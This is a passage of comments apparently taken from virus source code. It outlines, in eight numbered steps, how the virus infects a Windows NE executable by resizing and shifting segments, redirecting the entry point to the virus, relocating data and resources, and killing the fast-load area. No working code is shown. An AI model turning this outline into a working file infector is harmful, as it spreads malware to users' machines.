;This is the main virus routine. It simply finds a file to infect and infects

;******************************************************************************
;This routine modifies the file we found to put the virus in it. There are a
;number of steps in the infection process, as follows:
;    1) We have to modify the segment table. For the initial segment, this
;       involves (a) increasing the segment size by the size of the virus,
;       and (b) increase the minimum allocation size of the segment, if it
;       needs it. Every segment AFTER this initial segment must also be
;       adjusted by adding the size increase, in sectors, of the virus
;       to it.
;    2) We have to change the starting ip in the new header. The virus is
;       placed after the host code in this segment, so the new ip will be
;       the old segment size.
;    3) We have to move all sectors in the file after the initial code segment
;       out by VIRSECS, the size of the virus in sectors.
;    4) We have to move the relocatables, if any, at the end of the code
;       segment we are infecting, to make room for the virus code
;    5) We must move the virus code into the code segment we are infecting.
;    6) We must adjust the jump in the virus to go to the original entry point.
;    7) We must adjust the resource offsets in the resource table to reflect
;       their new locations.
;    8) We have to kill the fast-load area.
